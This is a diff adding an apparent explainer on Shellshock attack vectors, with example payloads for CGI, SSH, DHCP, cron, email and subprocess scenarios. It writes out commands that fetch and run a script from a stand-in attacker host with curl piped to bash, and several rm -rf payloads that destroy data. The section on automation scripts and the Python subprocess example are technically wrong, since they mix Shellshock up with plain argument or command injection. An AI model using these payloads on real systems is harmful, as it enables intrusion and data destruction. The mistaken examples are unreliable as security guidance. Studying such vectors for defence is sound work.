@@ -1,0 +1,88 @@
+1. Web Servers Using CGI Scripts
+
+    Many web servers (e.g., Apache, NGINX) support Common Gateway Interface (CGI) scripts to handle HTTP requests.
+    If CGI scripts invoke Bash, attackers can inject commands via HTTP headers like User-Agent or Referer.
+
+Example Exploit via HTTP Request:
+    GET /cgi-bin/test.cgi HTTP/1.1
+    Host: vulnerable.com
+    User-Agent: () { :; }; /bin/bash -c "curl http://attacker.com/malware.sh | bash"
+
+Vulnerable Scenarios:
+    Legacy systems running CGI scripts in Bash.
+    Custom scripts written by developers unaware of the vulnerability.
+
+2. SSH Servers Allowing Environment Variables
+
+    If an SSH server allows users to pass environment variables when logging in, attackers can exploit Shellshock by injecting malicious environment variable definitions.
+
+Example Exploit via SSH:
+ssh user@vulnerable-host "env x='() { :; }; echo Exploited' bash -c 'echo Hello'"
+
+Vulnerable Scenarios:
+    Misconfigured SSH servers that permit environment variable forwarding.
+    Systems using Bash as the default shell for user sessions.
+
+
+3. DHCP Clients
+
+    DHCP clients that use Bash scripts to handle responses can be exploited by a malicious DHCP server.
+    An attacker-controlled server can send malicious payloads in options like hostname or client ID.
+
+Example Exploit via Malicious DHCP Response:
+
+Option: () { :; }; /bin/bash -c "curl http://attacker.com/payload.sh | bash"
+
+    Vulnerable Scenarios:
+        Linux distributions or network configurations relying on Bash-based DHCP scripts.
+
+
+4. Server-Side Automation Scripts
+
+    Automated processes using Bash to manage configurations, execute commands, or process input are vulnerable.
+    Example: A backup script that processes unvalidated user input:
+
+# backup.sh
+tar -czf "$1".tar.gz /home/user/
+
+Exploit Command:
+
+./backup.sh "() { :; }; rm -rf / --no-preserve-root"
+
+5. Cron Jobs and System Daemons
+
+    Bash scripts executed as cron jobs or by daemons can inadvertently process malicious environment variables.
+    Example: A script that reads environment variables:
+
+# maintenance.sh
+echo "Running as $USER"
+
+Exploit by setting:
+
+env USER='() { :; }; malicious-command' ./maintenance.sh
+
+
+6. Web Applications Using Subprocess Calls
+
+    Applications that pass user input to system commands through Bash (e.g., subprocess.Popen in Python) are vulnerable.
+    Example in Python:
+
+import os
+os.system("echo " + user_input)
+
+Exploit Input:
+
+() { :; }; rm -rf /important-data
+
+
+
+7. Email Servers
+
+    Email servers using Bash scripts for processing (e.g., filters, aliases) can be exploited through malicious headers.
+    Example: A script that parses email headers:
+
+echo "Processing email for $RECIPIENT"
+
+Exploit:
+
+RECIPIENT='() { :; }; rm -rf /' ./process-email.sh
